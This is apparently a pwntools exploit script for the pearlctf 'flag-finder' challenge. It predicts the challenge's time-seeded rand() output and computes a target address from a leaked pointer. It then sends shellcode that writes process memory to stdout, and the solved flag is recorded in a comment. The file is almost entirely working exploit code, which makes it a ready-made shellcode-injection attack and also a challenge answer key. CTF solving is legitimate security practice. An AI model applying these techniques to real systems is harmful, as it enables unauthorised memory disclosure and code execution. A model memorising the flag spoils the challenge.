#!/usr/bin/env python3

from pwn import *
from time import sleep, time
import ctypes

exe = ELF("./flag-finder_patched")
libc = ctypes.CDLL('/lib/x86_64-linux-gnu/libm.so.6')
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc dyn.ctf.pearlctf.in 30012"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    libc.srand(int(time()))

    offset = libc.rand() % 0xfd1
    r.recvuntil(b"from ")
    addr = int(r.recvline()[:-1], 16) + offset

    shellcode = asm(f"""
                mov rax, 1
                mov rdi, 1
                mov rsi, {hex(addr)}
                mov rdx, 0x30
                syscall
                    """)
    r.sendline(shellcode)
    r.interactive()
    #pearl{f1nd_f1nd_f1nding_th3_fl4ggggg!}

if __name__ == "__main__":
    main()